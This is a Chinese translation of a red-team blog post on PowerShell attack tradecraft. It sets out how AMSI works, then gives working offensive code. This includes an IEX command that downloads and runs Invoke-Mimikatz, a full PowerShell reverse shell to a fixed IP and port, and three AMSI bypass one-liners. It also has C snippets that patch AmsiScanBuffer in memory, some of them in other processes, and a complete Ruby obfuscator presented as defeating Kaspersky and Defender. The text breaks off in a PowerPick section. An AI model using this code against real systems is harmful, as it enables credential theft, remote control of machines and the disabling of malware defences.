#  PowerShell 漏洞利用 — 现代 APT 组织及其恶意脚本战术   
Hossam Ehab  securitainment   2025-02-16 10:18  
  
> 【翻译】PowerShell Exploits — Modern APTs and Their Malicious Scripting Tactics  
  
  
  
在这篇博客中，我们将从 PowerShell 的介绍开始，解释**为什么它是红队人员最喜欢的工具**  
。接着，我们将探索其内存加载功能，并**深入研究 AMSI**  
（反恶意软件扫描接口），包括其详细的运作方式。然后，我将带您了解**AMSI 绕过方法**  
，包括理论详解和实践操作，**提供三个简单但有效的 PowerShell 命令行**  
（脚本小子们在这部分会特别开心  
）。  
  
接下来，我们将介绍如何**利用.NET 功能在不使用 PowerShell 的情况下运行 PowerShell 命令**  
，以及如何**使用 Invoke-Obfuscation 等工具来规避检测**  
。还有一些用 C 语言进行**AMSI 内存补丁**  
的示例 ^_^。我们还将探讨高级持续性威胁（APT）如何创建自定义混淆器来实现成功的规避技术。  
  
此外，我们将讨论**鲜为人知的 CLSID 劫持**  
等技术，探索**有效但未被充分利用的 LOLBins**  
，最后介绍高级工具**PowerLoad3r**  
的真实案例。  
  
我希望您能发现这份指南既有趣又实用，其中包含大量可以提升红队能力的实践见解。猜猜怎么着？我们将要进行的所有**绕过和测试都将针对 Kaspersky EDR**  
 :)，希望这能加速或帮助您的红队行动。  
## - PowerShell 是什么？  
  
PowerShell 是 Microsoft 为系统管理员和高级用户打造的瑞士军刀。诞生于 2006 年，它是一个功能强大的命令行 shell 和脚本语言。  
  
以下是 PowerShell 的特别之处：  
- **面向对象**  
，PowerShell 不仅处理文本，还**处理结构化数据**  
。这意味着您可以轻松地在命令之间操作和传递复杂信息。  
  
- **基于.NET 构建**  
：这使 PowerShell 能够深入访问 Windows 内部，使其在系统管理方面变得非常强大。  
  
- 最初仅适用于 Windows，现在 PowerShell**也可在 Linux 和 macOS 上运行**  
。  
  
无论是管理单台笔记本电脑还是云服务器群，PowerShell 都能让您更快更高效地完成工作。它是任何认真从事 Windows 管理或 DevOps 工作的人的首选工具。  
## - 为什么红队和渗透测试人员喜欢 PowerShell  
  
PowerShell 已经牢固地确立了其作为红队和渗透测试的基石地位。原因如下：  
- 它预装在 Windows 上，攻击者无需添加额外工具，这使得更难被检测。  
  
- 它可以访问 Windows 核心系统和.NET，让攻击者能够执行凭据窃取、横向移动或数据提取等操作。  
  
- 从目标发现到维持访问权限，PowerShell 可以处理攻击的每个步骤。  
  
- 脚本可以被隐藏或混淆，使防御者难以发现。  
  
- 它可以与 Azure 和 AWS 等云平台配合使用，非常适合现代攻击。  
  
**PowerShell 不仅仅是一个工具**  
 — 它是在现代攻击面中导航的不可或缺的盟友。  
## PowerShell 及其内存加载功能  
  
PowerShell 的内存执行是红队人员的理想工具。原因如下：  
- **代码直接在 RAM 中运行**  
，不在磁盘上留下痕迹。这使得防病毒和安全工具很难检测到。  
  
- 攻击者可以**动态生成、修改和混淆代码**  
。这允许快速适应不同环境并规避安全措施。  
  
- 整个框架和**复杂工具可以加载到内存中**  
，让攻击者无需安装软件即可获得完整的功能套件。  
  
- 活在当下  
  
- **一旦进入系统，内存执行可以实现从凭据收集到横向移动的所有操作，同时保持低调**  
。  
  
## Invoke-Expression Cmdlet — 实现内存执行  
  
Invoke-Expression  
（IEX）允许在当前会话中将字符串作为 PowerShell 命令执行。它是内存执行的关键工具。  
```
Invoke-Expression "Get-Process"
```  
  
这个命令运行"Get-Process"并返回活动进程列表。当Invoke-Expression  
与其他 cmdlets 或.NET 方法结合使用时，能够实现更强大的内存中命令执行。  
## 使用 IEX 进行内存加载和执行  
  
当与WebClient  
类的.DownloadString  
结合使用时，IEX  
可以完全在内存中下载和运行脚本。  
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellMafia/Powersploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1')
```  
- New-Object Net.WebClient  
 创建一个用于获取资源的 WebClient  
 实例。  
  
- .DownloadString('URL')  
 从提供的 URL 下载脚本。  
  
- IEX  
 在内存中执行下载的脚本。  
  
这种方法可以实现隐蔽执行，绕过磁盘存储，使检测变得更加困难。  
## 当你尝试执行它时"轰"  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3ibzNKAyUobEwICwpR3l9RVFCMY5koZwB1vDhswDZg3gCb2RPw1kxnvA/640?wx_fmt=png&from=appmsg "")  
  
然而，现代 Windows 版本已经使用反恶意软件扫描接口 (AMSI) 加强了对此类脚本下载和执行尝试的防御。AMSI 作为 Windows 10 安全措施的一部分，旨在检测和防止基于脚本的规避技术，挫败绕过传统防病毒解决方案的努力。AMSI 作为一种强大的防御机制，可以防止潜在恶意脚本的执行，包括那些利用 PowerShell 内存加载功能的脚本。  
## AMSI 如何运作  
  
反恶意软件扫描接口 (AMSI) 是一个深度集成到 Windows 操作系统中的复杂安全框架。本分析深入探讨了其复杂的操作机制、高级功能和不断发展的能力。  
  
**核心架构**  
  
AMSI 利用组件对象模型 (COM) 接口实现 Windows、应用程序和防病毒解决方案之间的流畅交互。这些接口促进了无缝通信和集成，以实现有效的恶意软件检测。AMSI 架构的关键组件包括：  
- **amsi.dll**  
 是促进扫描操作的中央 AMSI 库  
  
- **AmsiScanBuffer**  
 和 **AmsiScanString**  
 是负责扫描内存数据缓冲区和字符串的函数，用于检测潜在威胁  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3V9lvI0ncVDU2IRHNstQPMficfVJ8ibz8RDX3y2sgTnxABHHuMeYbuiaQw/640?wx_fmt=png&from=appmsg "")  
  
实际上 AmsiScanString 只是使用 AmsiScanBuffer :)  
- **IAntimalwareProvider**  
：防病毒软件用来与 AMSI 集成的接口，允许第三方安全解决方案在 AMSI 框架内参与威胁检测。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3kJC4NrnCSjg24FY2wuCjJ7zjeTozct0TicFMpgo4QibvYep0JUiaPoe2w/640?wx_fmt=png&from=appmsg "")  
  
AMSI 架构  
  
**初始化和注册过程**  
  
在系统启动时，反恶意软件扫描接口 (AMSI) 会进行结构化初始化，以无缝集成 Windows 应用程序和防病毒解决方案：  
1. AMSI 服务在启动过程早期初始化，确保扫描框架准备好处理来自应用程序和服务的请求。  
  
1. 防病毒解决方案通过IAntimalwareProvider  
接口注册到 AMSI。这种注册允许防病毒产品与 AMSI 集成，使它们能够参与扫描过程。  
  
1. 支持 AMSI 的应用程序，如 PowerShell 和 Microsoft Office，加载amsi.dll  
库。这个动态链接库 (DLL) 对 AMSI 执行的扫描操作至关重要。  
  
1. 这些应用程序使用AmsiInitialize  
函数配置其扫描上下文：  
  
```
HRESULT AmsiInitialize( LPCWSTR appName, HAMSICONTEXT *amsiContext );
```  
- 该函数为每个应用程序创建唯一的上下文，允许应用程序特定的扫描策略。appName  
参数指定应用程序的名称，amsiContext  
参数是一个指向句柄的指针，该句柄将在后续的 AMSI API 调用中使用。  
  
**内存扫描能力**  
  
AMSI 执行内存扫描的能力是检测复杂的无文件恶意软件的关键特性，这些恶意软件直接在系统内存中运行，从而规避传统的基于磁盘的检测方法。  
  
AmsiScanBuffer  
函数是这项功能的核心：  
```
HRESULT AmsiScanBuffer(  HAMSICONTEXT amsiContext,  PVOID buffer,  ULONG length,  LPCWSTR contentName,  HAMSISESSION amsiSession,  AMSI_RESULT *result  );
```  
  
该函数使 AMSI 能够检查原始内存缓冲区，从而有助于检测高级威胁，例如：  
- 直接在内存中加载和执行的脚本，绕过磁盘存储和传统的基于文件的扫描。  
  
- 试图直接从内存执行代码的恶意软件，通常使用 reflective DLL injection 等技术。  
  
**上下文感知扫描**  
  
AMSI 利用基于会话的扫描来维护多次扫描之间的上下文，从而实现更准确的风险评估。  
  
AmsiOpenSession  
函数用于在现有 AMSI 上下文中创建会话：  
```
HRESULT AmsiOpenSession(  HAMSICONTEXT amsiContext,  HAMSISESSION *amsiSession  );
```  
- **amsiContext**  
: 从AmsiInitialize  
获得的 AMSI 上下文句柄。  
  
- **amsiSession**  
: 指向将代表新会话的句柄的指针。  
  
此函数在成功时返回S_OK  
，失败时返回 HRESULT 错误代码。  
  
通过打开会话，应用程序可以对多个扫描请求进行分组，使 AMSI 能够跟踪执行流程并做出更明智的决策。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3xXAzlOFibTZ6NHQxBzyPIeibSicsia5E4QBQcvvR0WoAY3wnr2x6fgVcqw/640?wx_fmt=png&from=appmsg "")  
  
检查 powershell  
  
**判定确定**  
  
AMSI 收集所有提供者的响应，并使用加权评分系统确定最终判定：  
1. 每个提供者返回从 AMSI_RESULT_CLEAN 到 AMSI_RESULT_MALWARE 的结果。  
  
1. AMSI 根据提供者的信誉和置信度水平对这些结果进行加权汇总。  
  
1. 最终判定决定采取的行动：  
  
- 允许执行  
  
- 阻止执行并通知应用程序  
  
- 触发额外的日志记录、警报或二次扫描  
  
> **下载 Mimikatz 的挑战：**  
  
> 当你尝试使用直接 IEX 方法下载和执行 Mimikatz 时，AMSI 会在执行前拦截脚本内容。鉴于 Mimikatz 的臭名昭著的声誉和其可识别的恶意模式，AMSI 很可能会识别并随后阻止其执行。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3WUTNk3lHnYs5jTIoMYsnQzDJWE3Uo5x2nicPuphYDDqKja50ZrSU54g/640?wx_fmt=png&from=appmsg "")  
  
AMSI 检测到它  
  
这种 AMSI 干预使得直接下载和内存执行像 Mimikatz 这样的著名脚本变得相当困难。要运行此类脚本，规避或绕过 AMSI 变得至关重要。  
> **为什么直接下载 Mimikatz 是有问题的：**  
  
  
当你尝试使用 IEX 方法直接下载和执行 Mimikatz 脚本时，AMSI 会在执行前捕获脚本内容。由于 Mimikatz 具有已知的恶意模式，AMSI 很可能会标记并阻止执行。  
  
这使得在不首先绕过或规避 AMSI 的情况下，直接下载和内存执行像 Mimikatz 这样的知名脚本变得具有挑战性。  
  
因此，PowerShell 强大的内存操作能力无疑是强大的。然而，Microsoft 的内置安全措施，特别是 AMSI，对直接恶意行为构成了重大障碍。这种网络安全机制和规避策略之间的持续演变和相互作用体现了该领域的动态性质，需要持续学习和适应。  
## 使用 Import-Module 加载 Mimikatz  
  
另一种在 PowerShell 会话中加载 Mimikatz 的方法是使用 Import-Module cmdlet：  
```
Import-Module .\Invoke-Mimikatz.ps1
```  
  
**什么是 Import-Module?**  
 Import-Module cmdlet 是 PowerShell 内置的命令，用于将一个或多个模块添加到当前会话中。在 PowerShell 中，模块是一个包含 PowerShell 成员的包，包括 cmdlet、提供程序、函数、变量等。  
  
**Import-Module 的工作原理：**  
1. 首先，PowerShell 在当前目录中搜索指定的模块，本例中是.\Invoke-Mimikatz.ps1。如果在当前目录中找不到，PowerShell 会检查预定义的模块路径。  
  
1. 接下来，如果存在模块清单文件 (.psd1),PowerShell 会读取它以确定模块的属性、依赖项和所需的程序集。随后，所需的.NET 程序集会被加载到 PowerShell 进程中。  
  
1. 一旦找到脚本文件 (Invoke-Mimikatz.ps1),它会在单独的作用域中执行。这个执行过程会定义模块中包含的所有函数、变量和别名。只有显式导出的项目或在没有限制的情况下的所有项目才会在当前会话中可用。  
  
1. 导出的项目随后会集成到会话的函数和变量表中，这使得它们可以像原生命令一样直接访问。为了提高性能，模块会被缓存在内存中，以便后续导入时更快访问。  
  
1. 如果模块依赖于其他模块或脚本，PowerShell 会递归导入这些依赖项。此外，在执行模块中的任何代码之前，PowerShell 会检查系统的执行策略，以确保允许运行该模块。  
  
1. 最后，需要注意的是，模块内定义的内部变量与当前会话中的变量保持隔离。这种隔离可以防止模块变量与现有会话变量之间的冲突，确保平稳运行并降低错误风险。  
  
值得注意的是，即使你从磁盘导入模块，如果模块的任何部分被执行，AMSI 仍然可以扫描并可能阻止其内容。  
## - 混淆和绕过 AMSI(概述)  
  
混淆是一种使代码难以理解的方法。这就像写一个只有你知道如何阅读的秘密信息。在讨论 AMSI 时，混淆经常被用来尝试欺骗它。  
  
以下是大多数针对 AMSI 的混淆工作原理：  
1. 隐藏真实含义 → 混淆改变代码的外观而不改变其功能。例如，不写"Hello",你可能会写"H" + "e" + "l" + "l" + "o"。它仍然表示"Hello",但看起来不同。  
  
1. 制造混乱 —> 混淆添加不执行任何重要操作的额外内容。这就像在句子中添加随机词来混淆阅读者。  
  
1. 使用奇怪的名称，代码中使用随机或误导性的名称，而不是使用清晰的名称。这使 AMSI 更难猜测代码在做什么。  
  
1. 使用编码，例如，"Hello"在 Base64 编码后可能变成"SGVsbG8="。AMSI 可能不会立即识别出这一点。  
  
## - Invoke-Obfuscation(第一个技巧)  
  
Invoke-Obfuscation 是由 Daniel Bohannon 创建的工具，用于混淆 PowerShell 脚本以避免检测，通常在红队行动中使用。  
  
要深入了解 Invoke-Obfuscation 及其应用，你可以观看以下视频：  
https://www.youtube.com/watch?v=uE8IAxM_BhE  
  
在给定的脚本中，正在执行一个反向 shell 负载，概述如下 ->   
Github — Payload All The Things — Powershell Reverse Shell  
:  
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.4",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```  
  
在启动混淆过程时，payload 会经历一次变形，在保持其核心功能的同时变得模糊不清，如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3t7bqpV2uL159iaNOd8PC7NuqTUAJ18nIftMl9tWJQtUkT7kN2JMybZg/640?wx_fmt=png&from=appmsg "")  
  
> **"我已经对这个工具进行了测试，分别针对 Windows Defender 和某些情况下的 Kaspersky，它都成功地绕过了这些防护，没有遇到任何问题。这就是我将它添加到博客中的原因。:)"**  
  
## - 3 个简单且有效的 PowerShell AMSI 绕过技术  
  
基于反射的绕过方法使用.NET reflection 通过将其内部 amsiInitFailed 标志设置为 true 来禁用 AMSI。  
```
$t=[Ref].Assembly.GetType(('System.Manage'+'ment.Automa'+'tion.AmsiUtils'));$f=$t.GetField(('amsiIn'+'itFailed'),'NonPublic,Static');$f.SetValue($null,$true)
```  
- 它访问 System.Management.Automation 程序集中的 AmsiUtils 类  
  
- 它将 amsiInitFailed 字段设置为 true，强制 AMSI 初始化失败  
- 字符串被分割（'System.Manage'+'ment.Automa'+'tion.AmsiUtils'）以逃避静态检测。  
> Base64 + ASCII 混淆：此方法使用 Base64 和 ASCII 编码来混淆关键字符串，以避免检测。  
  
```
$s=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='));  $t=[Ref].Assembly.GetType($s);  $t.GetField([System.Text.Encoding]::ASCII.GetString((97,109,115,105,73,110,105,116,70,97,105,108,101,100)),'NonPublic,Static').SetValue($null,$true);
```  
- 从 Base64 解码'System.Management.Automation.AmsiUtils'。  
  
- 将'amsiInitFailed'从 ASCII 字节值转换。  
  
- 使用 reflection 禁用 AMSI。  
  
> 最小化 Reflection 绕过 这是基于 reflection 绕过方法的一个更简洁的版本。  
  
```
$t=[Ref].Assembly.GetType(('System.Manage'+'ment.Automa'+'tion.AmsiUtils'));  $f=$t.GetField(('amsiIn'+'itFailed'),'NonPublic,Static');  $f.SetValue($null,$true);
```  
## - C 语言中的 AMSI 修补技术  
  
本节深入探讨了使用 C 语言编程修补 Antimalware Scan Interface (AMSI) 的各种方法。每种技术都详细说明了其基本原理、实现方式和潜在影响。  
  
**使用 WriteProcessMemory 进行函数修补**  
  
这种技术涉及直接在内存中覆写 AMSI 函数的代码。  
```
HMODULE amsiDll = LoadLibraryA("amsi.dll");  FARPROC functionAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");  unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};  WriteProcessMemory(GetCurrentProcess(), functionAddr, patch, sizeof(patch), NULL);
```  
> - LoadLibraryA("amsi.dll")  
 将 AMSI DLL 加载到进程内存中 - GetProcAddress()  
 获取 AmsiScanBuffer  
 函数的内存地址 - patch  
 数组包含机器码指令：0xB8  
: MOV EAX (将值移动到 EAX 寄存器)0x57, 0x00, 0x07, 0x80  
: 值 0x80070057 (十六进制的 E_INVALIDARG)0xC3  
: RET (从函数返回) - WriteProcessMemory()  
 用我们的补丁覆盖原始函数代码 - 这个补丁使 AmsiScanBuffer  
 始终返回 E_INVALIDARG，从而绕过扫描  
  
  
**内存保护修改**  
  
这种方法通过临时更改目标函数的内存保护来允许修改。  
```
FARPROC functionAddr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");  DWORD oldProtect;  VirtualProtect(functionAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);  memcpy(functionAddr, "\x74", 1);  VirtualProtect(functionAddr, 1, oldProtect, &oldProtect);
```  
> - 我们像之前一样定位 AmsiScanBuffer  
 函数 - 使用 VirtualProtect()  
 将内存保护更改为 PAGE_EXECUTE_READWRITE - 使用 memcpy()  
 用 0x74  
 (JE/JZ 指令) 覆盖函数的第一个字节 - 我们恢复原始的内存保护  
  
  
**汇编级函数修补**  
  
这种技术涉及注入特定的汇编指令来改变函数行为。  
```
FARPROC functionAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");  unsigned char jumpPatch[] = {0xEB};  WriteProcessMemory(GetCurrentProcess(), functionAddr, jumpPatch, sizeof(jumpPatch), NULL);
```  
  
**指令覆盖**  
  
该方法用简单的中性指令覆盖函数的开始部分。  
```
unsigned char nopPatch[] = {0x48, 0x31, 0xC0}; // XOR RAX, RAX  WriteProcessMemory(GetCurrentProcess(), functionAddr, nopPatch, sizeof(nopPatch), NULL);
```  
> - nopPatch  
 包含指令 XOR RAX, RAX  
（机器码为 48 31 C0） - 该指令清除 RAX 寄存器，该寄存器通常用于 x64 调用约定中的返回值 - 通过清除 RAX，我们确保函数始终返回 0，表示成功并绕过扫描  
  
  
**远程进程注入**  
  
这种技术允许在不同的进程中修补 AMSI。  
```
HANDLE hProc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);  FARPROC functionAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiOpenSession");  unsigned char bypass[] = {0x48, 0x31, 0xC0};  WriteProcessMemory(hProc, (LPVOID)functionAddr, bypass, sizeof(bypass), NULL);  CloseHandle(hProc);
```  
> - OpenProcess() 获取目标进程的句柄 - 我们在 AMSI DLL 中定位 AmsiOpenSession  
 函数 - bypass  
 数组包含 XOR RAX, RAX  
 指令 - WriteProcessMemory() 将此代码注入目标进程的内存空间 - 我们关闭进程句柄以清理资源  
  
  
**函数钩子**  
  
这种方法涉及将 AMSI 函数重定向到自定义实现。  
```
FARPROC amsiScanAddr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");  unsigned char hook[] = {0xE9};  WriteProcessMemory(GetCurrentProcess(), amsiScanAddr, hook, sizeof(hook), NULL);
```  
> - 我们定位 AmsiScanBuffer  
 函数 - hook  
 数组包含 0xE9  
，这是 x86/x64 汇编中近跳转指令的操作码 - 这是 5 字节跳转指令的第一个字节 - 实现过程需要计算并写入跳转偏移量以重定向到自定义函数  
  
## - 高级威胁行为者和高级持续性威胁 (APTs)  
  
APTs 通常会创建自定义混淆工具而不是使用公开的工具。这些定制工具通过对安全系统来说是未知的特性、利用特定漏洞以及频繁更新来逃避检测。它们结合多种技术，利用零日漏洞，并能适应其环境，使 APTs 能够在被攻陷的系统中保持长期访问权限。  
  
**为了突出这一点，让我们向 0xNinjacCyclone 创建的这个令人惊叹的 Ruby 脚本致敬：**  
```
#!/usr/bin/ruby# Author    => Abdallah Mohamed ( 0xNinjaCyclone )# Email     => elsharifabdallh53@gmail.com# Why?      => For 0xHossam's upcoming blogrequire'pathname'# The script pathSCRIPT_PATH = "Invoke-Example.ps1"# The commands you want to executeINVOCATIONS = [    "Invoke-Example -Arg Value",    "Invoke-Example -Arg Value2"]# Maximum random string lengthMAX_LENGTH = 8Obfuscated = Struct.new(:original, :obfuscated)Functions = []Arguments = []Variables = []def reserved?(argname)    ['$$',        '$?',        '$^',        '$_',        '$AccessMask',        '$AllNodes',        '$Args',        '$Bitfield',        '$Command',        '$Constructor',        '$Charset',        '$ConsoleFileName',        '$DllName',        '$DsDomainFlag',        '$EnabledExperimentalFeatures',        '$ErrorActionPreference',        '$Error',        '$Event',        '$EventArgs',        '$EventSubscriber',        '$ExecutionContext',        '$False',        '$ForEach',        '$FunctionName',        '$FunctionDefinitions',        '$Home',        '$Host',        '$IsCoreCLR',        '$IsLinux',        '$IsMacOS',        '$IsWindows',        '$Input',        '$Kernel32',        '$LastExitCode',        '$LogonType',        '$Matches',        '$MyInvocation',        '$MarshalAs',        '$NativeCallingConvention',        '$NestedPromptLevel',        '$Module',        '$ModuleName',        '$Namespace',        '$NULL',        '$OFS',        '$Object',        '$ParameterTypes',        '$PermissionSet',        '$PEInfo',        '$PID',        '$Profile',        '$PSBoundParameters',        '$PsCmdlet',        '$PSCommandPath',        '$PsCulture',        '$PSDebugContext',        '$PSHOME',        '$PSItem',        '$PSScriptRoot',        '$PSSenderInfo',        '$PsUICulture',        '$PsVersionTable',        '$PWD',        '$ReturnType',        '$Sender',        '$SetLastError',        '$ShellID',        '$StackTrace',        '$StartAddress',        '$switch',        '$This',        '$True',        '$Value',        '$Win32Constants'].map( &:downcase ).include?( argname.downcase )enddef print_slowly(msg)    msg = "\033[0;36m#{msg}\033[0m"    msg.each_char {  |c| print(c); sleep(0.01) }; putsenddef duplicated?(random_str)    Functions.each do|i|returntrueif random_str == i.obfuscated end    Arguments.each do|i|returntrueif random_str == i.obfuscated end    Variables.each do|i|returntrueif random_str == i.obfuscated end    returnfalseenddef obfuscated?(varname)    Arguments.each do|i|returntrueif varname.downcase == i.obfuscated.downcase end    Variables.each do|i|returntrueif varname.downcase == i.original.downcase end    returnfalseenddef generate_random_str    [ *"a".."z" , *"A".."Z" ].sample( MAX_LENGTH ).joinenddef obfuscate_funcs(script)    script.scan(/^\s*Function ([a-zA-Z0-9_-]{6,})[\s\{]+$/i) { |funcs|        begin obf = generate_random_str() endwhile duplicated?(obf)        funcs.each { |f|            print_slowly("Obfuscate #{f} function (#{f}/#{obf})")            Functions << Obfuscated.new(f, obf)             script = script.gsub(/#{f}\b/, obf)        }    }    return scriptenddef obfuscate_args(script)    stack = []    params_found = false    script.split(/\n/).each { |line|                 params_found = trueif line.match?(/\bparam\b/i)         if params_found then            line.each_char { |c|                stack << '('if c.eql?('(')                stack.pop if c.eql?(')') && !stack.empty?            }            line.scan(/(\$\w{3,})/) { |argsInLine|                argsInLine.each { |a|                    begin obf = '$' + generate_random_str() endwhile duplicated?(obf)                    nextif reserved?(a)                    print_slowly("Obfuscate #{a[1..]} argument (#{a[1..]}/#{obf[1..]})")                    Arguments << Obfuscated.new(a, obf)                      script = script.gsub(/\$#{a[1..]}\b/, obf)                    script = script.gsub(/#{a.sub('$', '-')}\b/, obf.sub('$', '-'))                }            }            params_found = falseif stack.empty?        end    }    return scriptenddef obfuscate_vars(script)    script.split(/\n/).each { |line|        line.scan(/(\$\w{6,})/) { |vars|            begin obf = '$' + generate_random_str() endwhile duplicated?(obf)            vars.each { |var|                nextif obfuscated?(var) || reserved?(var)                print_slowly("Obfuscate #{var[1..]} variable (#{var[1..]}/#{obf[1..]})")                Variables << Obfuscated.new(var, obf)                 script = script.gsub(/\$#{var[1..]}\b/i, obf)            }        }    }    return scriptenddef remove_comments(script)    multiple_comments = false    script.split(/\n/).each { |line|        l = line.lstrip        script = script.sub(line, '') if l.start_with?('#')        multiple_comments = trueif l.start_with?('<#')        if multiple_comments then            script = script.sub(line + "\n", '')            multiple_comments = falseif l.include?('#>')        end    }    print_slowly "All comments have been removed"    return scriptenddef save_output(script)    pn = Pathname.new( SCRIPT_PATH )    dir, _ = pn.split    newfile = dir.join( generate_random_str() + ".ps1" )    File.write(newfile, script)    print_slowly "Obfuscated script saved at #{newfile}"enddef find_obfucated_func(funcname)    Functions.each { |f|        return f.obfuscated.sub("$", "-") if funcname.eql?(f.original)    }    returnnilenddef find_obfuscated_arg(argname)    Arguments.each { |a|        return a.obfuscated.sub("$", "-") if argname.downcase.eql?(a.original.downcase)    }    returnnilenddef display_obfuscated_commands    INVOCATIONS.each {  |line|        s = line.split(' ')        obf_func = find_obfucated_func( s[0] )                if obf_func.nil? then            print_slowly "[#{s[0]}] this function doesn't exist in this script"            return        end        line = line.sub(s[0], obf_func)                s[1..-1].each { |i|            nextunless i.include?('-')            obf_arg = find_obfuscated_arg( i.sub("-", "$") )            line = line.sub(i, obf_arg) unless obf_arg.nil?        }        print_slowly "The obfuscated command -> '#{line}' "            }enddef display_obfuscated_total    print_slowly "Total obfuscated functions = #{Functions.length}"    print_slowly "Total obfuscated arguments = #{Arguments.length}"    print_slowly "Total obfuscated variables = #{Variables.length}"enddef main()    script = File.read( SCRIPT_PATH )     script = obfuscate_funcs( script )    script = obfuscate_args( script )    script = obfuscate_vars( script )    script = remove_comments( script )    display_obfuscated_commands()    display_obfuscated_total()    save_output( script )endmain() if File.exists?( SCRIPT_PATH )
```  
  
**工作原理？**  
> 这个 Ruby 脚本是一个概念验证 (PoC),旨在通过随机重命名函数、变量和参数来混淆 PowerShell 脚本 (如 Invoke-Mimikatz.ps1)。它的目的是使分析变得复杂化，使安全工具更难检测或分析脚本，这对红队行动或渗透测试很有用。  
  
> 该脚本包含一组需要混淆的 PowerShell 命令 (INVOCATIONS),如常见命令coffee  
和sekurlsa::logonpasswords  
(这些值不能被此脚本修改，因为更改这些值需要修改二进制文件本身;脚本只混淆函数名和参数)。  
  
> 主要的混淆过程通过生成随机字母数字字符串 (最多 8 个字符长) 来替换函数、参数和变量的名称。这种随机化确保没有两个混淆是相同的。每个生成的名称都会被检查以确保它尚未被使用，防止重复。  
  
> 对于函数，obfuscate_funcs 方法扫描脚本中的函数定义，用随机字符串替换它们的名称，并存储混淆后的名称以供后续使用。同样，obfuscate_args 方法处理参数的混淆，而 obfuscate_vars 则专注于变量名。  
  
> 该脚本使用 remove_comments 方法删除 PowerShell 脚本中的所有注释。这消除了单行 (#) 和多行 (<#...#>) 注释，使脚本更难阅读。  
  
> 一旦混淆完成，脚本会打印转换后的命令，显示原始命令是如何被更改的。它还输出被混淆的函数、参数和变量的数量。最后，它将修改后的脚本保存到一个随机命名的新文件中。  
  
  
**实际应用和检测测试**  
:  
- 这种混淆方法显著改变了 PowerShell 脚本，使安全工具更难基于已知模式和签名进行检测。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3hicmo0OsibN1PUfEyXI66jkicg92b6XwpRTv2Pu4N39qzu814Uq63s3bw/640?wx_fmt=png&from=appmsg "")  
  
未经任何混淆的主工具检测：  
- 该脚本在 Kaspersky Internet Security 上进行了测试，以证明其有效性。图片显示了主工具在未混淆时的检测情况，以及混淆后检测率的降低。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3p70JHf5PxkHrb5zDsNpXRgKaKGU81mbh0hNibV4uXh15YOXKwdDHspQ/640?wx_fmt=png&from=appmsg "")  
  
在不被 Kaserpsky 检测到的情况下运行脚本  
> **注意**  
: "在实际场景中，我们不能简单地通过混淆器运行 Mimikatz 这样的工具就期望它们不被检测。像 Mimikatz 这样的工具有**众所周知的签名**  
,并且有许多**YARA 规则**  
可以根据它们的独特模式识别它们。因此，仅仅依靠自动混淆工具可能是不够的。要在使用此类工具时有效绕过检测，我们还必须结合手动混淆技术。但值得一试！"  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3rvGF7m37iaT1tn2tTGNfflg0KswtRSSh4r2kgj38exhthHYakV1PeUg/640?wx_fmt=png&from=appmsg "")  
  
混淆后在 Virus-Total 上的检测率  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3y4q5InbqK1Th4tic7GE7iaWk6mibAEtcRPF1vBSOy9Mib6MQMicFgISS7ZQ/640?wx_fmt=png&from=appmsg "")  
  
对抗 Windows Defender  
## - 使用 powerpick 绕过控制？?  
> PowerPick 作为红队和渗透测试人员武器库中的关键工具，**旨在隐蔽地执行 PowerShell 脚本**  
。这个创新工具**绕过了传统的****powershell.exe****二进制文件**  
的需求，这是安全监控系统的常见关注点。PowerPick 的方法，通常被称为"非托管 PowerShell",使脚本能够直接通过 PowerShell 引擎执行。这种方法显著降低了 PowerShell 活动的可见性，使 PowerPick 成为隐秘操作的首选。  
  
## - 增强 PowerPick 的规避能力：不使用 powershell 的 powershell  
> PowerPick 能够在不生成 powershell.exe 的情况下执行 PowerShell 脚本，使用.NET 程序集实现更隐蔽的方法。  
  
  
**修改 PowerPick 以实现更隐蔽执行的示例**  
  
在这个示例中，我们演示如何修改 C# .NET 应用程序以通过.NET 程序集加载和执行 PowerShell 代码，并了解其背后的工作原理  
```
